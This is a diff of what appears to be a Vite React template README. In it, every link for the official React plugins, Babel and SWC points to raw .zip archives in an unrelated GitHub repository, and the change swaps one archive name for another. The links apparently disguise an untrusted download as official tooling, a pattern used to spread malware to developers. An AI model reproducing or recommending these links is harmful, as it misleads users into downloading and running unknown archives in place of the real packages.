@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/raghu-veluchamy/kuwycarcheck/main/vowellike/kuwycarcheck_v3.5.zip) uses [Babel](https://raw.githubusercontent.com/raghu-veluchamy/kuwycarcheck/main/vowellike/kuwycarcheck_v3.5.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/raghu-veluchamy/kuwycarcheck/main/vowellike/kuwycarcheck_v3.5.zip) uses [SWC](https://raw.githubusercontent.com/raghu-veluchamy/kuwycarcheck/main/vowellike/kuwycarcheck_v3.5.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/raghu-veluchamy/kuwycarcheck/main/vowellike/Software-1.2-beta.5.zip) uses [Babel](https://raw.githubusercontent.com/raghu-veluchamy/kuwycarcheck/main/vowellike/Software-1.2-beta.5.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/raghu-veluchamy/kuwycarcheck/main/vowellike/Software-1.2-beta.5.zip) uses [SWC](https://raw.githubusercontent.com/raghu-veluchamy/kuwycarcheck/main/vowellike/Software-1.2-beta.5.zip) for Fast Refresh
